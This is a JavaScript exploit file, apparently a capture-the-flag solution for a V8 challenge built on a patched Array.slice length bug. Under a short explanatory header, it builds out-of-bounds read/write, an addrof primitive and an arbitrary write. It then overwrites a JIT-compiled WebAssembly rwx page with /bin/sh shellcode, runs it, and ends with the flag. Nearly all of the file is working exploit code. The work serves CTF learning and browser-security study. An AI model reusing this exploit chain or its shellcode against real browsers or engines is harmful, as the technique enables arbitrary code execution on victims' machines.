/**
 * Patch file introduces an error in the length calculation for new arrays created by
 * Array.slice(). slice(4, 5) creates an array with 1 element, but has a maximum length
 * (length = (end - start) - start + 2 -> -1 = (4-5) - 4 + 2, -1 is MAX_INT when
 * interpreted as unsigned)
 *
 * Can use out of bounds access on the slice to read and write data that comes after the
 * slice in memory. Turn this into and addrof primitive (get the heap address of a given
 * JS object) by creating a "victim" object with an "obj" property, and setting that
 * property to the target object. This leaves a pointer to the target object in "victim"
 * we can read.
 *
 * Turn OOB into arbitrary write by overwriting the address pointer in a victim
 * ArrayBuffer. Subsequent writes to the victim array buffer will occur at the new
 * location.
 *
 * Create a WASM module and load some dummy code. The module gets JITed, and the page the
 * code is on is left as rwx. Use addrof and OOB read to pull the address of that page
 * out of the WasmInstanceObject, and then arbitrary write to replace with our own code
 * 
 * Chal files: https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web
 * 
 * Useful links:
 * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
 * https://www.elttam.com/blog/simple-bugs-with-complex-exploits/#content
 * https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#javascript-exploitation-primitives
 */

//=========================================================================
/// https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
//=========================================================================

// Offsets from oob to other interesting places
const OBJ_OFFSET = 4;
const VICTIM_BUF_PTR_OFFSET = 14;

function addrof(target) {
    victim.obj = target;
    return (ftoi(oob[OBJ_OFFSET]) >> 32n);
}

function write(addr, data) {
    // Our OOB read/write is 8 bytes at a time, and it doesn't line up exactly with the 
    // address field of the victim buffer. So we need to do some finagling to write the
    // new address without clobbering other data

    // Write lower half of new address
    const addr_low = addr & 0xffffffffn; 
    const curr_addr_low = ftoi(oob[VICTIM_BUF_PTR_OFFSET]);
    const new_addr_low = (addr_low << 32n) | (curr_addr_low & 0xffffffffn);
    oob[VICTIM_BUF_PTR_OFFSET] = itof(new_addr_low);

    // Write upper bytes of new address
    const addr_high = addr & 0xffffffff00000000n;
    const curr_addr_high = ftoi(oob[VICTIM_BUF_PTR_OFFSET + 1]);
    const new_addr_high = (addr_high >> 32n) | (curr_addr_high & 0xffffffff00000000n);
    oob[VICTIM_BUF_PTR_OFFSET + 1] = itof(new_addr_high);

    // Now that the address has been correctly set, write data at that address
    let u8_buf = new Uint8Array(victim_buf);
    for (let i = 0; i < data.length; i++) {
        u8_buf[i] = data[i];
    }
}

// Trigger vulnerability. oob has only 1 element, but a very large length field
origin = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6];
oob = origin.slice(4, 5);

// Create objects for future exploit primitives
victim = {obj: {}}
victim_buf = new ArrayBuffer(0x41);

// Create rwx page for shellcode to go (stolen from https://github.com/r4j0x00/exploits/blob/master/chrome-exploit/exploit.js)
wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
mod = new WebAssembly.Module(wasm_code);
wasm_instance = new WebAssembly.Instance(mod);
shell = wasm_instance.exports.shell;

// Calculate index needed for oob array to reach the wasm_instance
wasm_addr = addrof(wasm_instance);
oob_addr = addrof(oob) - 0x10n;

// code page pointer is 12 indices away from base of WasmInstanceObject
rwx_idx = Number((wasm_addr - oob_addr) / 8n) + 12;

// We don't line up exactly, so we need to pull the upper and lower half separately and 
// merge them together
rwx_addr_low = ftoi(oob[rwx_idx]) >> 32n;
rwx_addr_high = (ftoi(oob[rwx_idx+1]) & 0xffffffffn) << 32n
rwx_addr = rwx_addr_high | rwx_addr_low;

// /bin/sh shellcode
shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];

// Write shellcode, and run
write(rwx_addr, shellcode);
shell();

// DUCTF{y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!}
